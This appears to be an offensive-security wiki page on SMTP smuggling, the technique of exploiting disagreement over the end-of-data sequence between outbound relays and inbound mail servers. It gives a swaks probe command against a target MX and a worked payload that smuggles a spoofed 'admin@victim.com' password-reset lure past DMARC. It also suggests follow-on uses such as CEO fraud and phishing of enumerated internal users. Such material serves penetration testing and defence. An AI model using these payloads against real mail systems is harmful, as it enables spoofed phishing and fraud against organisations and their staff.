---
title: "SMTP smuggling: injecting spoofed transactions across relay disagreement"
description: "When an outbound relay and an inbound server disagree on the end-of-data sequence, bytes the outbound relay passes through literally are treated as end-of-data by the inbound server, so the data after them is parsed as a brand-new SMTP transaction on the same trusted, SPF/DKIM-aligned connection, yielding a fully spoofed message that passes DMARC."
keywords:
  - smtp smuggling
  - end of data
  - dmarc bypass
  - email spoofing
  - message boundary
---

# SMTP smuggling

The DATA phase of SMTP ends at a single canonical sequence: `<CR><LF>.<CR><LF>` (a line containing only a dot). SMTP smuggling, published by Timo Longin at SEC Consult, exploits the fact that implementations disagree about what else counts as that boundary. Some servers also end the message on `<LF>.<LF>`, or `<CR>.<CR>`, or `<CR><LF>.<CR>`, accepting a lone-LF or lone-CR dot-line that the standard would not. If you relay a message through an outbound provider that is SPF- and DKIM-aligned for its own domain, and embed an end-of-data variant that the outbound relay forwards *literally* (it does not treat it as the end) but the inbound server *does* treat as the end, then the inbound server closes your intended message early and parses whatever you put after it as a fresh `MAIL FROM`/`RCPT TO`/`DATA` on the same connection. That connection is still the outbound provider's authenticated, reputation-bearing session, so the smuggled message inherits its SPF and DKIM alignment and passes DMARC with a sender you chose.

## Preconditions

- An account on an outbound provider whose relay is permissive about the end-of-data sequence (the outbound half must pass your crafted dot-line through unmodified inside DATA).
- A target whose inbound server honors a non-standard end-of-data variant (the inbound half must terminate early on it).
- The spoofable domain is not arbitrary. The smuggled envelope only earns an aligned SPF pass if that domain's SPF record authorizes the originating relay's IP, so in practice you spoof domains hosted by or sharing the same outbound provider (co-tenants, or the provider's own domains). DKIM is not inherited from the carrier message, so the smuggled sender relies on SPF-based DMARC alone.

Fingerprint the inbound server's end-of-data handling directly: send one message whose DATA embeds a non-standard dot-line followed by a full second envelope, and see whether the target receives one message or two.

```bash
swaks --server mx.victim.com --to probe@victim.com --from you@aligned.com \
      --data $'From: you@aligned.com\r\nSubject: probe\r\n\r\nbody-one\n.\nMAIL FROM:<spoof@victim.com>\r\nRCPT TO:<probe@victim.com>\r\nDATA\r\nFrom: spoof@victim.com\r\nSubject: smuggled\r\n\r\nbody-two\r\n.\r\n'
# probe@victim.com receives TWO messages (the second From: spoof@victim.com) => the inbound MX
# terminated DATA on the bare-LF dot line and is smugglable; ONE message => it does not honor it
```

That tests only the inbound half. The end-to-end attack also needs an outbound relay that forwards `<LF>.<LF>` literally inside DATA, which you confirm separately by sending the same crafted message through your provider to a mailbox you control and checking it arrives intact rather than being normalized or split at the relay.

## Worked payload

You submit one message through the aligned outbound relay. Its DATA contains an early non-standard terminator, then the smuggled second transaction:

```text
MAIL FROM:<you@aligned.com>
RCPT TO:<you@aligned.com>
DATA
From: you@aligned.com
Subject: carrier

carrier body
<LF>.<LF>                         <- lone-LF dot: inbound server treats this as END OF DATA
MAIL FROM:<admin@victim.com>      <- parsed by inbound as a NEW transaction on the trusted conn
RCPT TO:<target@victim.com>
DATA
From: admin@victim.com
Subject: Mandatory password reset
To: target@victim.com

Click the portal link and re-authenticate.
.
```
The outbound relay sees `<LF>.<LF>` as ordinary body text and forwards everything as one message; the inbound server stops at `<LF>.<LF>`, then reads the `MAIL FROM:<admin@victim.com>` block as a genuine new message arriving over the aligned session. The smuggled message carries no DKIM signature for `victim.com`, so it survives DMARC only when `victim.com`'s SPF authorizes the originating relay (for example when `victim.com` and the outbound provider share infrastructure); where that holds, the SPF-aligned pass on the smuggled envelope is enough for DMARC and `target@victim.com` receives mail that appears to come from `admin@victim.com`.

Pick the variant per receiver from the fingerprint step: use `<LF>.<LF>` against inbound servers that accept bare-LF, `<CR>.<CR>` or `<CR><LF>.<CR>` against those that accept bare-CR. The right variant is the one the inbound honors and the outbound ignores.

## Follow-on

- Deliver internal-looking spoofed mail for CEO fraud, password-reset lures, or approval fraud that survives DMARC, which an [open relay](open-relay.md) spoof usually cannot.
- Chain with [user enumeration](user-enumeration.md) to address real internal recipients and with harvested org data to make the smuggled `From:` and content convincing.

## Tools

- [The-Login: SMTP Smuggling tools (PoC)](https://github.com/The-Login/SMTP-Smuggling-Tools)
- [swaks](https://github.com/jetmore/swaks)

## References

- [SEC Consult: SMTP smuggling, spoofing emails worldwide](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [The-Login: SMTP Smuggling tools and technical details](https://github.com/The-Login/SMTP-Smuggling-Tools)
- [RFC 5321 section 4.1.1.4 (DATA end sequence)](https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.4)
